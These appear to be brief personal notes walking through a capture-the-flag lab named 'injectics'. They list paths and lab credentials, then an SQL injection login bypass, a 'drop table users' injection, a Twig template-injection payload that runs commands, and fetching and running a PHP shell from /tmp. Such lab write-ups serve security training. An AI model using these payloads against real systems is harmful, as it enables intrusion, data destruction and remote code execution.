22  
80
 
/login.php  
/adminLogin007.php  
/phpmyadmin
 
/script.js (/login.php -> functions.php -> dashboard.php)
 
/flags
 
home page source code:  
dev@injectics.thm:devPasswd123  
superadmin@injectics.thm:superSecurePasswd101  
mail is is mail.log
 
# get passed window-side filtering by editing the request in burp for the username and password to: a' || 1=1 -- -
 
/dashboard.php?is_admin=false
 
when you submit the medals count, change the request in burp so that bronze=1; drop table users -- -
 
After a couple minutes table will return with default credentials
 
login to /adminLogin007.php with superadmin creds
 
go to profile (update_profile.php), see that if you change the first name it will change it on the dashboard page. Look up php server side template injection payloads (SSTI)
 
try the Twig ones on hacktricks
 
{{['id',""]|sort('passthru')}}
 
wget php shell, save to /tmp  
run it
 
look at flags directory for final flag